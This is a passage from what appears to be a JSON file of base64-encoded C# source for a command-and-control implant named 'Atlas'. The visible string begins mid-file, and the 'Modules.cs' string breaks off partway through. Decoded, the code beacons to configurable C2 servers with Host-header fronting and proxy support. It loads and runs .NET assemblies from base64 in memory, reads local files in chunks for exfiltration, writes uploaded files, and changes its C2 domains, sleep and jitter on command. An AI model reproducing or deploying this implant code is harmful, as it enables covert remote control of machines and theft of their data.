CAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuUmVtb3ZlQXQoMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0rKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlJlbW92ZUpvYihKb2IsIEpvYkxpc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KI2lmIChERUZBVUxUIHx8IERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXQoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdlYlByb3h5IHByb3h5ID0gbmV3IFdlYlByb3h5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBBZGRyZXNzID0gbmV3IFVyaShDb25maWcuUHJveHlBZGRyZXNzKSwNCiAgICAgICAgICAgICAgICAgICAgVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIENyZWRlbnRpYWxzID0gbmV3IE5ldHdvcmtDcmVkZW50aWFsKENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gcHJveHk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCBDb25maWcuVXNlckFnZW50KTsNCiAgICAgICAgICAgIGlmIChDb25maWcuSG9zdEhlYWRlciAhPSAiIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIkhvc3QiLCBDb25maWcuSG9zdEhlYWRlcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuUXVlcnlTdHJpbmcuQWRkKENvbmZpZy5QYXJhbSwgQjY0RGF0YS5SZXBsYWNlKCIrIiwgIiUyQiIpLlJlcGxhY2UoIi8iLCAiJTJGIikuUmVwbGFjZSgiPSIsICIlM0QiKS5SZXBsYWNlKCJcbiIsICIlMEEiKSk7DQogICAgICAgICAgICBDb25maWcuU2VydmVycyA9IENvbmZpZy5TZXJ2ZXJzLk9yZGVyQnkocz0+cy5jb3VudCkuVG9MaXN0KCk7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXN1bHQgPSBjbGllbnQuRG93bmxvYWRTdHJpbmcoQ29uZmlnLlNlcnZlcnNbMF0uZG9tYWluICsgQ29uZmlnLlVybCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlnLlNlcnZlcnNbMF0uY291bnQrKzsgDQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFBvc3Qoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgV2ViUHJveHkgcHJveHkgPSBuZXcgV2ViUHJveHkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEFkZHJlc3MgPSBuZXcgVXJpKENvbmZpZy5Qcm94eUFkZHJlc3MpLA0KICAgICAgICAgICAgICAgICAgICBVc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgQ3JlZGVudGlhbHMgPSBuZXcgTmV0d29ya0NyZWRlbnRpYWwoQ29uZmlnLlByb3h5VXNlciwgQ29uZmlnLlByb3h5UGFzc3dvcmQpDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICBjbGllbnQuUHJveHkgPSBwcm94eTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNsaWVudC5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsIENvbmZpZy5Vc2VyQWdlbnQpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5Ib3N0SGVhZGVyICE9ICIiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNsaWVudC5IZWFkZXJzLkFkZCgiSG9zdCIsIENvbmZpZy5Ib3N0SGVhZGVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzID0gQ29uZmlnLlNlcnZlcnMuT3JkZXJCeShzID0+IHMuY291bnQpLlRvTGlzdCgpOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzdWx0ID0gY2xpZW50LlVwbG9hZFN0cmluZyhDb25maWcuU2VydmVyc1swXS5kb21haW4gKyBDb25maWcuVXJsLCBCNjREYXRhKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWcuU2VydmVyc1swXS5jb3VudCsrOw0KICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiNlbmRpZg0KICAgIH0NCn0NCg=="
        },
        {
          "Modules.cs": "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsNCnVzaW5nIFN5c3RlbS5JTzsNCnVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KdXNpbmcgU3lzdGVtLkxpbnE7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIGNsYXNzIE1vZHVsZXMNCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBDaGVjayhzdHJpbmcgRmlsZUlkKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBib29sIGEgPSBDb25maWcuTW9kdWxlcy5Db250YWluc0tleShGaWxlSWQpOw0KICAgICAgICAgICAgICAgIHJldHVybiBhOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRGdWxsTmFtZShzdHJpbmcgRmlsZUlkKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2soRmlsZUlkKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN0cmluZyBGdWxsTmFtZSA9IENvbmZpZy5Nb2R1bGVzW0ZpbGVJZF07DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBGdWxsTmFtZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgTGlzdEFzc2VtYmxpZXMoKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgQXNzZW1ibHlMaXN0ID0gIiI7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChLZXlWYWx1ZVBhaXI8c3RyaW5nLCBzdHJpbmc+IEVudHJ5IGluIENvbmZpZy5Nb2R1bGVzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIE1vZHVsZSA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhFbnRyeS5WYWx1ZSkpOw0KICAgICAgICAgICAgICAgICAgICBzdHJpbmdbXSBBc3NlbWJseSA9IE1vZHVsZS5TcGxpdCgnLCcpOw0KICAgICAgICAgICAgICAgICAgICBBc3NlbWJseUxpc3QgKz0gQXNzZW1ibHlbMF0gKyAnXG4nOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gQXNzZW1ibHlMaXN0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gQXNzZW1ibHlMaXN0ID0gIiI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgTG9hZChzdHJpbmcgRmlsZUlkLCBzdHJpbmcgQjY0QXNzZW1ibHkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChDaGVjayhGaWxlSWQpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgYSA9IEFzc2VtYmx5LkxvYWQoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKEI2NEFzc2VtYmx5KSk7DQogICAgICAgICAgICAgICAgICAgIHN0cmluZyBmdWxsbmFtZSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhhLkZ1bGxOYW1lKSk7DQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5Nb2R1bGVzLkFkZChGaWxlSWQsIGZ1bGxuYW1lKTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBJbnZva2Uoc3RyaW5nIEZpbGVJZCwgc3RyaW5nW10gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIG91dHB1dCA9ICIiOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIEZ1bGxOYW1lID0gR2V0RnVsbE5hbWUoRmlsZUlkKTsNCiAgICAgICAgICAgICAgICBBc3NlbWJseVtdIGFzc2VtcyA9IEFwcERvbWFpbi5DdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKTsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChBc3NlbWJseSBhc3NlbSBpbiBhc3NlbXMpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoYXNzZW0uRnVsbE5hbWUgPT0gRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKEZ1bGxOYW1lKSkpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIE1ldGhvZEluZm8gZW50cnlwb2ludCA9IGFzc2VtLkVudHJ5UG9pbnQ7DQogICAgICAgICAgICAgICAgICAgICAgICBvYmplY3RbXSBhcmcgPSBuZXcgb2JqZWN0W10geyBhcmdzIH07DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRXcml0ZXIgcmVhbFN0ZE91dCA9IENvbnNvbGUuT3V0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyaXRlciByZWFsU3RkRXJyID0gQ29uc29sZS5FcnJvcjsNCiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRXcml0ZXIgc3RkT3V0V3JpdGVyID0gbmV3IFN0cmluZ1dyaXRlcigpOw0KICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyaXRlciBzdGRFcnJXcml0ZXIgPSBuZXcgU3RyaW5nV3JpdGVyKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLlNldE91dChzdGRPdXRXcml0ZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5TZXRFcnJvcihzdGRFcnJXcml0ZXIpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBlbnRyeXBvaW50Lkludm9rZShudWxsLCBhcmcpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLk91dC5GbHVzaCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5FcnJvci5GbHVzaCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5TZXRPdXQocmVhbFN0ZE91dCk7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLlNldEVycm9yKHJlYWxTdGRFcnIpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBzdGRPdXRXcml0ZXIuVG9TdHJpbmcoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCArPSBzdGRFcnJXcml0ZXIuVG9TdHJpbmcoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJ5dGVbXSBHZXRBc3NlbWJseShMaXN0PHN0cmluZz4gQ2h1bmtzLCBpbnQgVG90YWxDaHVua3MpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBGaW5hbEFzc2VtYmx5ID0gbmV3IGJ5dGVbXSB7IH07DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBieXRlW11bXSBBc3NlbWJseUFycmF5ID0gbmV3IGJ5dGVbVG90YWxDaHVua3NdW107DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIGNodW5rIGluIENodW5rcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGludCBpbmRleCA9IENodW5rcy5JbmRleE9mKGNodW5rKTsNCiAgICAgICAgICAgICAgICAgICAgQXNzZW1ibHlBcnJheVtpbmRleF0gPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoY2h1bmspOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBGaW5hbEFzc2VtYmx5ID0gQ29tYmluZShBc3NlbWJseUFycmF5KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gRmluYWxBc3NlbWJseTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIEZpbmFsQXNzZW1ibHk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJ5dGVbXSBDb21iaW5lKHBhcmFtcyBieXRlW11bXSBhcnJheXMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBydiA9IG5ldyBieXRlW2FycmF5cy5TdW0oYSA9PiBhLkxlbmd0aCldOw0KICAgICAgICAgICAgaW50IG9mZnNldCA9IDA7DQogICAgICAgICAgICBmb3JlYWNoIChieXRlW10gYXJyYXkgaW4gYXJyYXlzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEJ1ZmZlci5CbG9ja0NvcHkoYXJyYXksIDAsIHJ2LCBvZmZzZXQsIGFycmF5Lkxlbmd0aCk7DQogICAgICAgICAgICAgICAgb2Zmc2V0ICs9IGFycmF5Lkxlbmd0aDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBydjsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgRG93bmxvYWQNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyB1bG9uZyBHZXRUb3RhbENodW5rcyhzdHJpbmcgRmlsZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgZmkgPSBuZXcgRmlsZUluZm8oRmlsZSk7DQogICAgICAgICAgICAgICAgdWxvbmcgdG90YWxfY2h1bmtzID0gKHVsb25nKShmaS5MZW5ndGggKyBDb25maWcuQ2h1bmtTaXplIC0gMSkgLyBDb25maWcuQ2h1bmtTaXplOw0KICAgICAgICAgICAgICAgIHJldHVybiB0b3RhbF9jaHVua3M7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgbG9uZyBHZXRGaWxlU2l6ZShzdHJpbmcgRmlsZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgZmkgPSBuZXcgRmlsZUluZm8oRmlsZSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZpLkxlbmd0aDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0UGF0aChzdHJpbmcgRmlsZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gUGF0aC5HZXRGdWxsUGF0aChGaWxlKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0Q2h1bmsoc3RyaW5nIEZpbGUsIGludCBDaHVua051bSwgaW50IFRvdGFsQ2h1bmtzLCBsb25nIEZpbGVTaXplKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbGVfY2h1bmsgPSBudWxsOw0KICAgICAgICAgICAgICAgICAgICBsb25nIHBvcyA9IENodW5rTnVtICogQ29uZmlnLkNodW5rU2l6ZTsNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKEZpbGVTdHJlYW0gZmlsZVN0cmVhbSA9IG5ldyBGaWxlU3RyZWFtKEZpbGUsIEZpbGVNb2RlLk9wZW4pKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlU3RyZWFtLlBvc2l0aW9uID0gcG9zOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFRvdGFsQ2h1bmtzID09IENodW5rTnVtICsgMSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2NodW5rID0gbmV3IGJ5dGVbRmlsZVNpemUgLSAoQ2h1bmtOdW0gKiBDb25maWcuQ2h1bmtTaXplKV07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGNodW5rX3NpemUgPSBmaWxlX2NodW5rLkxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlU3RyZWFtLlJlYWQoZmlsZV9jaHVuaywgMCwgY2h1bmtfc2l6ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9jaHVuayA9IG5ldyBieXRlW0NvbmZpZy5DaHVua1NpemVdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVTdHJlYW0uUmVhZChmaWxlX2NodW5rLCAwLCBDb25maWcuQ2h1bmtTaXplKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhmaWxlX2NodW5rKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAiRXJyb3IgcmVhZGluZyBmaWxlIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgVXBsb2FkKHN0cmluZyBGaWxlLCBzdHJpbmcgQ2h1bmtEYXRhKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBieXRlW10gY2h1bmtfZGF0YSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhDaHVua0RhdGEpOw0KICAgICAgICAgICAgICAgIHVzaW5nIChGaWxlU3RyZWFtIGZpbGVTdHJlYW0gPSBuZXcgRmlsZVN0cmVhbShGaWxlLCBGaWxlTW9kZS5BcHBlbmQpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgZmlsZVN0cmVhbS5Xcml0ZShjaHVua19kYXRhLCAwLCBjaHVua19kYXRhLkxlbmd0aCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgU2V0Q29uZmlnKHN0cmluZyBhcmcpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZ1tdIGFyZ3MgPSBhcmcuU3BsaXQoKTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN3aXRjaCAoYXJnc1swXS5Ub1N0cmluZygpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiZG9tYWluIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhcmdzWzFdID09ICJhZGQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlNlcnZlciBzZXJ2ZXIgPSBuZXcgVXRpbHMuU2VydmVyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBhcmdzWzJdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudCA9IDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzLkFkZChzZXJ2ZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoYXJnc1sxXSA9PSAicmVtb3ZlIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoQ29uZmlnLlNlcnZlcnMuQ291bnQgPT0gMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5TZXJ2ZXIgc2VydmVyIGluIENvbmZpZy5TZXJ2ZXJzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoc2VydmVyLmRvbWFpbiA9PSBhcmdzWzJdKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzLlJlbW92ZShzZXJ2ZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY2FzZSAic2xlZXAiOg0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNsZWVwID0gaW50LlBhcnNlKGFyZ3NbMV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImppdHRlciI6DQogICAgICAgICAgICAgICAgICAgICAg